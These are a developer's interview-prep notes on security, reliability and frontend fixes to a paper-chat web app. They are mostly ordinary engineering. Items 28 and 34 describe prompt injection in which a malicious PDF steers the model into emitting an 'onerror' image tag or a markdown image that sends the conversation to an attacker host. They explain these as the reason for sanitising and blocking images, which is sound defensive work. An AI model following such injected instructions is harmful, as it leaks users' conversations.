# Prep notes: what I fixed in InCite AI, and how to talk about it

These are my notes for interviews. For every change: what was wrong, why it
mattered, how I'd explain it in about 30 seconds, and one follow-up question
I should expect, with an answer.

## The story in one minute

InCite AI lets you upload research papers and chat with them. When I audited
it properly, I found that it worked in the demo but not in the ways that
matter: any logged-in user could read or delete anyone's paper, PDFs could be
downloaded without logging in, the JWT secret was printed to the logs, both AI
models it used had been shut down by Google, summaries only read the first
7,000 characters, and "automatic paper selection" was the model guessing from
a list of titles. I fixed those one at a time, wrote a test for each that
failed before the fix and passed after, and measured the parts where there was
a real trade-off (the relevance threshold, whole-paper summaries vs.
map-reduce, how many excerpts to retrieve) on real data instead of guessing.

## Numbers worth remembering

- Relevance cutoff: questions my papers answer scored **0.31-0.56**, off-topic
  questions **0.03-0.17**, so I set the cutoff at **0.25**.
- Summary of an ~86,000-character document: before (first 7,000 chars) 1 call,
  ~1.7k input tokens; whole paper 1 call, ~22k input tokens, ~18 s;
  map-reduce 5 calls, ~86 s. Whole-paper wins for anything under ~400k
  characters.
- Gemini 3.6 Flash accepts ~1M input tokens per request.
- Pinecone free tier: 5M embedding tokens a month; my whole library re-indexed
  for about 2% of that.
- Chunk overlap costs ~20% more chunks.
- Test suite: 116 tests, no API keys needed.
- Chat display: a demo answer took **10 s** to appear after the server had
  sent it (20 ms per character); now **0.1 s**.
- Button contrast: white on teal-500 **2.5:1** (fails WCAG's 4.5:1); teal-700
  **5.5:1**.

---

## Phase 1: security

### 1. The JWT secret (and tokens) were written to the logs
- **What was wrong:** the auth middleware ran `console.log(JWT_SECRET)` and
  logged the user's token on every request; login and signup logged every new
  token.
- **Why it mattered:** anyone who can read logs (and logs are shared much more
  widely than databases) could forge a token for any user with the secret, or
  impersonate a user for 3 hours with a token.
- **In 30 seconds:** "The middleware logged the signing secret and each
  session token. I removed those lines and added a test that captures all log
  output during signup, login and an authenticated request and fails if the
  secret or anything shaped like a JWT appears. I also made sure the test
  really catches it by putting the log line back and watching it fail."
- **Follow-up:** *If the secret had leaked, what would you do?* Rotate it
  (which logs everyone out, since all existing tokens become invalid), check
  the logs' retention and who had access, and look for tokens issued that
  nobody logged in for.

### 2. A hard-coded fallback secret
- **What was wrong:** `process.env.JWT_SECRET || 'your_jwt_secret'`.
- **Why it mattered:** that string is in a public repo. If the variable were
  ever missing in a deployment, anyone could sign valid tokens, and nothing
  would warn you.
- **In 30 seconds:** "I made the secret come from one module that throws at
  startup if it's not set. Failing loudly is safer than running with a secret
  everyone can read."
- **Follow-up:** *Why not generate a random secret at startup instead?* Then
  every restart (or every instance behind a load balancer) would have a
  different secret and log everyone out, or reject tokens issued by another
  instance. Configuration is the right place for it.

### 3. Users could read, analyse and delete other users' papers
- **What was wrong:** summarize, summary, assess, assessment and delete looked
  papers up with `Paper.findById(id)` and never compared the owner with the
  logged-in user. `/search` returned everyone's papers.
- **Why it mattered:** this is an IDOR (insecure direct object reference): with
  any paper id you could read someone's results, spend their AI quota, or
  delete their paper. A two-user test showed exactly that.
- **In 30 seconds:** "Every paper route now goes through one helper,
  `findOwnedPaper(id, userId)`, which queries by id *and* owner. It returns
  null for 'not found', 'not yours' and 'malformed id' alike, and the route
  answers 404 in all three cases, so an attacker can't even learn that a paper
  exists. Search is always scoped to the caller."
- **Follow-up:** *Why 404 and not 403?* 403 confirms the resource exists.
  404 leaks nothing. (403 is fine when existence isn't sensitive.)

### 4. Files were identified by a filename that users can share
- **What was wrong:** PDFs were stored in GridFS under their original filename
  and looked up by that name. If two users both uploaded `paper.pdf`, one
  could get the other's file in summaries and chat, and deleting one paper
  deleted every file with that name.
- **Why it mattered:** data leaking between users and data loss, from
  something as ordinary as a common filename.
- **In 30 seconds:** "Each paper now records the GridFS id of its own file and
  always reads or deletes exactly that file. For papers uploaded before the
  fix, the fallback is 'this filename, uploaded by this owner'. I tested it
  with two users uploading the same filename."
- **Follow-up:** *How did you handle existing data?* The fallback covers old
  records without a migration. The test for that path originally passed
  without exercising anything (see item 17), which taught me to make tests
  prove they changed something.

### 5. Downloads needed no login, and a missing file crashed the server
- **What was wrong:** `GET /download/:filename` had no authentication. Its
  error handler was attached to the response instead of the file stream, so a
  request for a file that didn't exist raised an unhandled error.
- **Why it mattered:** anyone could fetch any PDF they could guess the name of,
  and one anonymous request could stop the Node process.
- **In 30 seconds:** "Downloads now require login, go by paper id, check
  ownership, and return 404 before streaming if anything is missing. The bug
  was `.pipe(res).on('error')`: `pipe` returns the destination, so the
  listener was on the wrong stream."
- **Follow-up:** *Why does an unhandled stream error crash Node?* An
  EventEmitter that emits `'error'` with no listener throws. Thrown outside a
  try/catch, that's an uncaught exception, and Node's default is to exit.

### 6. Deleting a paper never deleted its vectors
- **What was wrong:** the delete functions weren't exported, so the routes
  called `undefined`, and they passed `{ filter: {...} }`, which the Pinecone JS
  SDK treats as the filter itself (a field literally named "filter").
- **Why it mattered:** chat could keep quoting papers the user had deleted.
- **In 30 seconds:** "Two bugs stacked: missing exports and the Python-style
  filter shape. I fixed both, and changed the order: delete the searchable
  vectors first, then the file and the record. If Pinecone fails, the paper is
  still intact and the user can retry, instead of a 'deleted' paper that chat
  can still quote."
- **Follow-up:** *Why that order?* The worst state is 'gone from the list but
  still searchable'. Deleting vectors first means a failure leaves everything
  visible and retryable.

### 7. Dead socket.io code
- **What was wrong:** a Socket.IO server whose handler referenced variables
  that didn't exist; no client ever connected.
- **In 30 seconds:** "I checked both client and server for any use, removed it
  and its two packages. Less code, less attack surface."
- **Follow-up:** *How did you make sure nothing used it?* Searched both apps
  for socket usage and checked `npm ls` showed nothing else depending on the
  packages.

## Things I found along the way

### 8. The login library couldn't even load on current Node
- `jsonwebtoken` → `jws` → `jwa@1.4.1` loaded a module that reads
  `SlowBuffer`, which Node 25 removed. A lockfile-only bump to `jwa@1.4.2`
  (within existing version ranges) fixed it: it only loads that module as a
  fallback for very old Node.
- **Follow-up:** *How did you find the fix?* I read the stack trace to find
  the module, then read the published source of newer `jwa` versions to
  confirm the change before upgrading.

### 9. Small PDFs failed to parse at random on Node 26
- **What was wrong:** `pdf-parse` bundles pdf.js from 2017, which copies its
  input as a Node `Buffer` and assumes the copy starts at offset 0 of its
  memory. Node puts small buffers into a shared pool at varying offsets, and
  Node 26 raised the pool from 8 KB to 64 KB, so any PDF under ~32 KB could
  fail ("bad XRef entry") or be read from the wrong bytes.
- **In 30 seconds:** "It looked random, so I reproduced it in fresh processes,
  traced it to the buffer pool, and fixed it with one wrapper that passes a
  plain `Uint8Array`, which always gets its own memory."
- **Follow-up:** *Why not just upgrade pdf-parse?* That's a bigger change with
  its own risks; a one-line, well-understood fix with a test was the safer
  step.

### 10. multer upgrade, and a regression I caught
- `multer@1.4.2` had nine advisories (mostly denial-of-service). Upgrading to
  2.x changed how filenames are decoded: `résumé.pdf` arrived garbled. I
  compared both versions side by side, fixed it with `defParamCharset: 'utf8'`
  and added a test. I removed an unused package that pinned multer to 1.x
  (with permission).
- **Follow-up:** *How do you upgrade safely?* Read the advisories and the
  changelog, run the tests, and look for behaviour changes the tests don't
  cover yet (this one I found by testing non-ASCII names on purpose).

### 11. Running it locally was impossible
- Eight client files hard-coded the production API URL, and the cookie used
  `SameSite=None` without `Secure`, which browsers reject over plain http. Now
  there is one config value, Vite proxies `/api` to the local server, and the
  cookie is `Lax` in development and `None; Secure` in production.

### 12. How everything is tested
- **What I set up:** `node:test` plus `mongodb-memory-server` (a real,
  throwaway MongoDB), with Gemini and Pinecone replaced by in-memory fakes
  installed through Node's module cache. The fakes behave like the real
  services where it matters: the fake Pinecone enforces the 96-record limit and
  metadata types, and the fake Gemini returns valid JSON for a schema.
- **In 30 seconds:** "Each fix started with a test that reproduced the bug,
  for example two users where Bob deletes Alice's paper. I watched it fail,
  fixed the code, and watched it pass. For subtle fixes I also broke the code
  on purpose to check the test would notice."
- **Follow-up:** *Isn't mocking the AI cheating?* The tests check my code's
  behaviour (ownership, retries, validation), not the model's quality. For
  things only the real services can answer (does JSON mode accept this schema,
  what scores does real search produce) I ran small, read-only checks against
  the real APIs.

## Phase 2: the models had been retired

### 13. Moving to a current model, and making the next move a config change
- **What was wrong:** `gemini-1.5-flash` (shut down September 2025) and
  `embedding-001` (shut down October 2025), via an SDK Google deprecated in
  November 2025.
- **In 30 seconds:** "All Gemini calls now go through one module using
  `@google/genai`, and the model comes from `GEMINI_MODEL`, so the next
  retirement is a config change. I checked Google's deprecation pages instead
  of trusting my memory for model names."
- **Follow-up:** *Why 3.6 Flash and not the bigger model?* Answers are
  grounded in retrieved text, so retrieval quality matters more than model
  size, and the smaller model is gentler on free-tier limits. It's one
  environment variable to try the other.

### 14. Pinecone does the embedding, one namespace per user
- **What I did:** the Pinecone index already used *integrated embedding*
  (`llama-text-embed-v2`), so the app now sends text and Pinecone embeds it,
  for free within the Starter plan. Each user's chunks live in their own
  namespace.
- **In 30 seconds:** "Pinecone recommends one namespace per tenant. It means
  isolation by construction: a search can only see the namespace it's given,
  so even a forgotten filter can't leak another user's chunks. It's also
  cheaper, because queries only scan that user's data, and deleting a user's
  data is deleting their namespace."
- **Follow-up:** *Any downside?* The free plan allows 100 namespaces per index,
  so about 100 users with papers; a paid plan raises that a lot.

### 15. Why re-embedding was unavoidable
- **In 30 seconds:** "Each embedding model has its own coordinate system; a
  vector from one model and one from another aren't comparable even if both
  have 768 numbers. And the old model couldn't be called any more. So I wrote
  a reindex script that reads every PDF from MongoDB and re-embeds it into the
  new namespaces, never touching the old data, with a dry-run mode and safe to
  re-run."
- **Follow-up:** *How do you make re-runs safe?* Deterministic chunk ids
  (`<paperId>#<n>`) so writes overwrite instead of duplicating, and the script
  clears a paper's old chunks before writing new ones.

### 16. The "400 characters" chunk limit wasn't enforced
- The splitter only broke at a full stop followed by a capital letter, so
  reference lists became one chunk of thousands of characters. Long pieces are
  now cut at a space; no text is dropped.

### 17. A test that passed without testing anything
- My test for "old papers without a file id" removed the field from a
  collection called `papers`. Mongoose stores the `Paper` model in a collection
  called `paper` (it treats "paper" as uncountable), so the update matched
  nothing and the test passed vacuously. I fixed it to assert that exactly one
  document changed, then broke the fallback on purpose to confirm the test now
  fails.
- **Follow-up:** *What's the lesson?* A test should prove its setup did what
  it claims, and you should see it fail at least once.

## Phase 3: reliable structured output

### 18. JSON from the model, validated
- **What was wrong:** prompts asked nicely for JSON, then `JSON.parse`. Tests
  showed: JSON wrapped in a sentence gave a 500; a summary missing "findings"
  was saved; an assessment scoring 150/100 was saved. The page would crash on
  a missing nested field.
- **In 30 seconds:** "I use Gemini's JSON mode with a response schema, then
  validate the reply against the same schema (required fields, allowed
  ratings, score range, no empty strings), retry once, and if it's still bad
  return a 502 with a helpful message and save nothing. JSON mode guarantees
  syntax, not content, which is why the validation step stays."
- **Follow-up:** *Why 502?* It's 'bad gateway': my server is fine but the
  upstream service gave an unusable answer. A 500 suggests a bug in my code.

## Phase 4: finding the right paper

### 19. Identify papers by id, not title
- The client sent the paper's *title*, and titles often come from the PDF's
  built-in metadata rather than the filename, so many papers couldn't be found.
  Now the client sends the MongoDB `_id`. A selected paper is sent in full if
  it's under ~100k characters, otherwise its most relevant excerpts.

### 20. Paper selection by retrieval, with an honest "not found"
- **What was wrong:** the README claimed embeddings chose the paper, but the
  code asked the model to pick from a list of titles.
- **In 30 seconds:** "I embed the question, fetch the 20 most similar chunks
  from the user's namespace, group them by paper, and pick the paper with the
  best average of its top 3 chunks, which rewards several relevant passages
  over one lucky match. If even the best chunk is below 0.25, the app says it
  couldn't find the topic instead of guessing. I chose 0.25 from real data:
  relevant questions scored 0.31-0.56, off-topic 0.03-0.17."
- **Follow-up:** *Weaknesses?* One paper per answer; long papers have a slight
  edge; the threshold came from a small sample, so it's configurable.

## Phase 5: summaries that see the whole paper

### 21. Whole paper in one call; map-reduce only for huge documents
- **What was wrong:** summaries read the first 7,000 characters (about 7-20% of
  a typical paper), so findings and conclusions were mostly invented.
- **In 30 seconds:** "The model accepts about a million tokens, so for normal
  papers the cheapest way to see everything is one request with the full
  text. Map-reduce (notes on each part, then a combined result) is only used
  above 400k characters, capped at 8 note calls. I measured both on a real
  86k-character document: one call took ~18 s; map-reduce took 5 calls and
  ~86 s and lost connections between sections."
- **Follow-up:** *Why keep map-reduce at all?* Very long documents (books,
  full lecture sets) can still exceed what's sensible to send at once, and it
  keeps cost bounded with the call cap.

## Phase 6: robustness and retrieval quality

### 22. Uploads that fail cleanly
- **What was wrong:** indexing ran inside an `async` stream event handler.
  Event emitters ignore the returned promise, so a Pinecone error became an
  unhandled rejection that stops the server, the request hung, a half-indexed
  paper stayed behind, and the response said "201 Upload complete" regardless.
- **In 30 seconds:** "Every step is awaited inside one try. On failure I remove
  whatever was created (chunks, record, file). I retry rate limits and network
  errors with back-off, but not 500/503, which the SDK already retries, so the
  waits don't multiply. The response is per file: 201, 207 for partial, 422 for
  unreadable PDFs, 502 for a backing-service failure."
- **Follow-up:** *What if clean-up itself fails?* Each clean-up step is tried
  independently, and chat ignores chunks whose paper no longer exists, so a
  leftover can't be quoted.

### 23. One sentence of overlap between chunks
- A statement on a chunk boundary was split in half. Each chunk now starts
  with the previous chunk's last sentence (when it fits), costing ~20% more
  chunks.

### 24. How many excerpts per answer
- I checked real searches: for narrow questions the top 4 were enough, but
  for "explain" or "walk me through" questions ranks 5-8 still held relevant
  passages. The default is now 8 (configurable), which costs about 400 more
  tokens per question.

### 25. Sources under every answer
- The answer streams as plain text, so its sources travel in an `X-Sources`
  header (URL-encoded JSON, because headers must be ASCII), and CORS exposes
  that header because in production the frontend is a different site.

---

## Phase 7: the frontend

How I checked it: `npm run build`, ESLint (4 errors before, 0 after), and a
throwaway Puppeteer script run against the real Express app with an in-memory
MongoDB and fake AI services. It took screenshots at 1440 px and 390 px
(phone) width, checked for sideways scrolling, and clicked through upload,
chat, summary, assessment, delete and logout.

### 26. The home page claimed features that don't exist
- **What was wrong:** it advertised DOC and plain-text uploads, OCR, drag and
  drop, citation management, collaboration, exports, a "knowledge graph",
  "Live" analytics (1,247 papers processed) and a semantic-search demo with
  invented "98% match" results.
- **In 30 seconds:** "I rewrote it to list only what the app does, and checked
  each claim against the code: the 10-file upload limit, the actual summary
  and assessment fields, even the server's exact 'not found' reply, which the
  page shows as an example. I added two honest notes: scanned PDFs can't be
  read, and voice only works in some browsers."
- **Follow-up:** *Why bother for a student project?* Anyone who tries the app
  finds out in a minute, and a page that overclaims makes them doubt the parts
  that are real.

### 27. It didn't work on phones
- **What was wrong:** the login card was a fixed 850 px wide. The login
  page's CSS set styles on `body`, `form`, `a`, `.container` and `.btn`, and
  because Vite bundles every imported CSS file globally, those styles leaked
  into every page. The dashboard's fixed sidebar and split view didn't fit a
  phone, and the mobile menu was broken.
- **In 30 seconds:** "I rebuilt the login and sign-up pages in Tailwind and
  deleted the leaking CSS. On a phone the paper list is a slide-in drawer and
  an open paper gets Paper | Chat tabs. Both panels stay mounted and are only
  hidden with CSS, so switching tabs doesn't lose the conversation."
- **Follow-up:** *Why not render only the active tab?* Unmounting the chat
  would throw away its state: the messages, the draft and an answer still
  streaming in. Hiding it costs one hidden iframe.

### 28. Chat: 20 ms per character, and unsanitised HTML
- **What was wrong:** the client replayed each streamed character on a 20 ms
  timer, so a 500-character answer took 10 extra seconds to appear. The
  model's markdown went through `marked` into `dangerouslySetInnerHTML`
  without sanitising.
- **In 30 seconds:** "Chunks are now shown as they arrive: in the demo the
  answer finishes in 0.1 s instead of 10 s. Markdown is converted with
  `marked`, cleaned with DOMPurify, and styled with Tailwind's typography
  plugin. The user's own messages are shown as plain text."
- **Follow-up:** *Why sanitise if the cookie is httpOnly?* httpOnly stops a
  script from reading the token, but an injected script can still send
  requests as the user from their own browser, e.g. delete their papers. A
  malicious PDF can steer the model into writing an `<img onerror=...>` tag.
  Sanitising removes it.

### 29. Dashboard: login check, no reloads, no alert()
- **What was wrong:** logged-out visitors saw a broken dashboard. Uploads and
  deletes reloaded the whole page, errors used `alert()` and `confirm()`, and
  the welcome text was fixed on first load, so after selecting a paper it
  still said "Attach a paper to get started".
- **In 30 seconds:** "The dashboard checks the session once and redirects to
  login on a 401. Uploads and deletes bump a `refreshKey` prop that makes the
  paper list refetch, and results show in a small notification or inline.
  Delete asks for confirmation inline and says what will be removed."
- **Follow-up:** *Why a counter prop and not a global store?* One list, two
  triggers: a counter is the smallest thing that works. With more shared
  server state I'd use a query cache such as TanStack Query.

### 30. Accessibility
- Icon buttons have labels; paper cards are real buttons; the paper/chat
  divider is a `role="separator"` you can move with the arrow keys; pop-ups
  use the native `<dialog>` (Escape closes it, focus stays inside, the page
  behind is inert); Enter doesn't send while an input method (e.g. for Hindi)
  is composing; each page has its own title; animations respect "reduce
  motion".
- Contrast: white text on `teal-500` is about 2.5:1, below the WCAG minimum
  of 4.5:1. Buttons now use `teal-700` (about 5.5:1).
- **Follow-up:** *Why `<dialog>` and not a div?* `showModal()` gives focus
  containment, Escape and an inert background from the browser. A div modal
  has to rebuild all three and usually misses one.

### 31. Small bugs found on the way
- Search highlighting reused a `/g` regex with `test()`, which keeps its
  position (`lastIndex`) between calls, so some matches weren't highlighted.
  Now it uses `split()` with a capture group (matches land at odd indexes).
- Windows reports `.csv` files as `application/vnd.ms-excel`, so the chat
  rejected CSV attachments. It now checks the file extension.
- Dragging the divider stopped working over the PDF, because an iframe
  swallows mouse events. A transparent overlay covers the page while
  dragging.
- A failed paper-list load showed the error and "No papers uploaded yet" at
  the same time.

## Phase 8: chat history

### 32. Saving chat history never worked
- **What was wrong:** two bugs, each enough on its own. A middleware for
  this route called `JSON.parse(req.body)`, but the app-wide JSON parser had
  already turned the client's JSON into an object, so every save got a 400
  (and it ran before the login check, so logged-out requests got 400 instead
  of 401). Behind that, the database only allowed the roles `user` and
  `vega` (the app's old name), while the client sends `user` and
  `assistant`, so even a parsable body would have failed with a 500.
- **In 30 seconds:** "I wrote the tests first and watched them fail with
  exactly those errors. The route now accepts JSON, or the same JSON as
  `text/plain`, validates the messages, and the roles match what the chat
  already uses. An optional client-chosen session id turns saving into an
  upsert, so saving the same conversation twice updates it instead of
  duplicating it. Then I closed a tab in headless Chrome against a
  cross-origin, production-mode setup and checked the conversation arrived."
- **Follow-up:** *Why accept `text/plain` at all?* A JSON POST to another
  site needs a CORS preflight; `text/plain` is a "simple" request that
  doesn't. That matters for requests sent while a page is closing
  (`sendBeacon` only sends simple types without a preflight). Chrome handled
  the preflighted JSON save in my test, but accepting both keeps the client
  free to switch.
- **Follow-up:** *Could someone overwrite another user's conversation by
  guessing its session id?* No: the upsert's filter is (user id, session
  id), so the same id from another user creates or updates their own
  document. There's a test for exactly that, and a unique index on the pair
  stops two concurrent saves from creating duplicates.

---

## Phase 9: problems found after deploying

### 33. Logging in on a phone looped back to the login page
- **What was wrong:** the site (Vercel) called the API on another site
  (Render), so the login cookie was a third-party cookie. Safari on iPhone
  and several other browsers block those: the login response arrived but the
  cookie wasn't stored, and the next request got a 401. Desktop Chrome still
  allows them, which is why it only failed on phones. Before the dashboard
  checked the login, the same bug showed up as "please log in" errors.
- **In 30 seconds:** "I reproduced it with Chrome's third-party cookie
  blocking and a cross-site local setup: login 200, check-login 401. The fix
  is to make the API same-origin: `vercel.json` forwards `/api/*` to Render
  and the app calls `/api`, so the cookie belongs to the site itself. With
  blocking on, the dashboard now opens. I also turned off Vercel's caching
  for `/api`, because a cached per-user response could be served to someone
  else."
- **Follow-up:** *What does the proxy cost?* One extra hop through Vercel's
  network, and a 120-second limit on how long Vercel waits for the API,
  which is enough for a summary even when Render is waking up. In return
  there's no CORS preflight on every request.

### 34. Formulas showed up as `$\mu_E$`
- **What was wrong:** Gemini writes math in LaTeX, and the app showed the
  source text.
- **In 30 seconds:** "All model text now goes through one renderer: marked
  with two small extensions for `$...$`, `$$...$$`, `\(...\)` and `\[...\]`,
  KaTeX, then DOMPurify. Single `$` follows Pandoc's rule so '$5 and $10'
  stays text. I tested it with a nasty answer: prices, escaped dollars, code
  spans, injected HTML and images."
- **Follow-up:** *Why block images in answers?* Prompt injection: a PDF can
  tell the model to write `![x](https://attacker/?q=<the conversation>)`, and
  the browser would fetch that URL just by showing the answer. The app never
  needs images there, so they are removed, and so is `url(...)` in styles.
- **Follow-up:** *KaTeX is big. Did that slow the site down?* It added about
  80 KB (gzipped) to the one bundle everybody downloaded, so I made the
  dashboard a lazily loaded chunk. The home page now downloads 81 KB of
  JavaScript instead of 132 KB.

---

## What I'd still change (say this before they ask)

- Show saved conversations in the app, and also save when leaving the
  dashboard inside the app and on `pagehide` (phones often skip
  `beforeunload`).
- Add upload size limits and rate limiting.
- Remove unused dependencies and work through the `npm audit` findings.
- Turn the Puppeteer checks into real browser tests in the repo (sources,
  upload messages, the phone layout), since the server tests don't cover the
  UI.
